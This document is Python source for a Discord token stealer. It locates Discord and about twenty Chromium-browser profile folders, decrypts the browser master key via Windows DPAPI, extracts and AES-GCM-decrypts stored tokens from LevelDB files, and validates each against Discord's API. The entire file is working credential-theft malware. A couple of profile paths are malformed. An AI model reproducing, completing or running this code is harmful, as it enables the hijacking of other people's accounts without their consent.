import os
import re
import json
import base64
import win32crypt
import requests
from Cryptodome.Cipher import AES

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def enc(path):
    try:
        with open(path + "\\Local State", "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def dec(encrypted, key):
    try:
        encrypted = encrypted[3:]
        iv = encrypted[:12]
        payload = encrypted[12:-16]
        tag = encrypted[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        return cipher.decrypt_and_verify(payload, tag).decode()
    except:
        return None

def isvalid(token):
    try:
        headers = {"Authorization": token}
        res = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        return res.status_code == 200
    except:
        return False

def ext():
    tokens = []
    for _, path in PATHS.items():
        if not os.path.exists(path):
            continue

        key = enc(path)
        if not key:
            continue

        db_path = os.path.join(path, "Local Storage", "leveldb")
        if not os.path.exists(db_path):
            continue

        for file_name in os.listdir(db_path):
            if not file_name.endswith((".log", ".ldb")):
                continue
            file_path = os.path.join(db_path, file_name)
            try:
                with open(file_path, "r", errors="ignore") as file:
                    for line in file:
                        matches = re.findall(r'dQw4w9WgXcQ:[^\"]+', line)
                        for match in matches:
                            try:
                                encoded = match.split("dQw4w9WgXcQ:")[1]
                                enc_data = base64.b64decode(encoded)
                                token = dec(enc_data, key)
                                if token and isvalid(token):
                                    tokens.append(token)
                            except:
                                continue
            except:
                continue
    return tokens

